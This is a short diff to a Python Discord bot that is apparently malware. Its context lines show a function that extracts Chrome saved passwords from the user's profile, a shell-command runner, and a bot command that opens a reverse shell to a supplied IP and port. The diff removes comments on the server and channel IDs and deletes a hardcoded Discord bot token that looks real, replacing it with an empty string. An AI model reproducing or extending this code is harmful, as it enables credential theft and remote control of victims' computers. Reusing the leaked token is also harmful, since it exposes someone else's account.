@@ -26,9 +26,8 @@ def run_command(command):
     return out if not err else err
 
 # Constants
-GUILD_ID = "1269910214468173914"  # Replace with your Discord server ID
-CHANNEL_ID = "1269910214468173917"  # Replace with your channel ID
-
+GUILD_ID = "1269910214468173914"  
+CHANNEL_ID = "1269910214468173917"  
 # Chrome function to extract passwords
 def chrome():
     CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (os.environ['USERPROFILE']))
@@ -366,5 +365,5 @@ async def revshell_cmd(ctx: commands.Context, ip: str, port: int):
         await ctx.reply("Failed to start the reverse shell.")
 
 # Run the bot with your token
-bot.run('MTI3NDU1MTQwMzk4MDkxODk0OA.GB9vkK.hD0bYscA5VjmfP3EDxzge0YFDa2j2Lt_XDiYaI')
+bot.run('')
 
